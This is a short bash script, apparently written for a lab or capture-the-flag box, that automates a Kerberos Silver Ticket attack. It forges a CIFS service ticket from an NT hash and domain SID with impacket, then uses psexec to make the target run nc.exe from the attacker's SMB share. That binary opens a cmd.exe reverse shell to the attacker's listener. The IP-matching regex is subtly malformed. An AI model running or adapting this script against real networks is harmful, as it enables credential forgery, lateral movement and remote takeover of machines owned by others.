#!/bin/bash

NTHASH=""
DOMAIN_SID=""
USER=""
HOST=""
DOMAIN=""

if [ $UID -ne 0 ]; then
  echo "[-] It should be executed as root"
  exit 1
fi

echo "[+] Launching the SMB Server"
impacket-smbserver evil . 1>/dev/null &

server_pid=$!
ip=$(ifconfig tun0 | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[0-9]{1,3}\.[0-9]{1,3}' | grep -m 1 10.)

echo "[+] Creating the 'Silver Ticket'"
python3 /opt/impacket/examples/ticketer.py -nthash $NTHASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$HOST $USER 1>/dev/null &
export KRB5CCNAME=$(pwd)/$USER.ccache 1>/dev/null

echo "[+] Executing the command using the TGS"
python3 /opt/impacket/examples/psexec.py -no-pass -k $DOMAIN/$USER@$HOST "\\\\${ip}\\evil\\nc.exe -e cmd.exe ${ip} 8000" 1>/dev/null &

echo "[*] Killing the SMB Server"
kill $server_pid

echo "[+] Listening for connections"
nc -lp 8000
